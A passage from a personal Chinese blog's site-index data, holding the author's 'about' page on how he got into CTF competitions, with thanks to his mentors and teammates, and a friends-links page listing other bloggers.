找到组织在入学之后进了一个学校里的计算机吹水群（bushi），某一天，我在上面看见一个社团招新公告，上面附有一个解谜游戏的链接，国庆在家无聊就玩了起来，从此踏上了 CTF 的不归路， 也因此结识了 GZTime 学长————可以说是我计算机方面真正的领路人，教会了我很多东西。同时也遇到了 tel 、大菠萝、yescallop、Hanmur 等志同道合的伙伴，还进了学校的计算机社团和 CTF 战队。 如果上天再给我一次填报高考志愿的机会，我想我还是会作出同样的选择，与学校本身无关，只因我舍不得我的这些朋友。也只有在与他们水群和打比赛的时候，我才能忘却内卷与一切烦恼。 彼岸不论如何，我今后仍旧会坚持自己的热爱，与同道一齐，追寻梦想。愿与诸君共勉，在网络空间上做些贡献，也算不枉一身所学。 我现在在干什么玩 CTF、学算法、学数学以及写一些没什么基础也能看懂的文章，谨以此记念我曾经在搜索引擎上摸爬滚打的经历。","link":"/about/index.html"},{"title":"categories","text":"","link":"/categories/index.html"},{"title":"友链","text":"DaLaosGZTime Walking on the Time Axis. 小傅Fox 一个博客不写技术的 dalao Darkyzhou MC 爱好者 jiahonzheng 请叫他 ++ 春哥 一人攻沙虐全场 朋友们Hanmur 一位帅气且有趣的学长 yescallop Rust 水平相当高 FluoriteFire Walking to a new world Tel where are you a39 歩いても、歩いても Elapsedf Think what you want Pazuris Fear neither hardship nor darkness yring 冥冥之中 自有天意 LilRan 今日启程 无畏向前 Lst4r 小铁大客户 夏槿 的小屋 欢迎来交换友链ヾ(≧▽≦*)o 1234- name: weyung link: https://blog.weyung.cc/ avatar: https://blog.weyung.cc/images/avatar.png descr: 写一些和我一样菜也能看懂的文章","link":"/links/index.html"},{"title":"标签","text":"","link":"/tags/index.html"}]}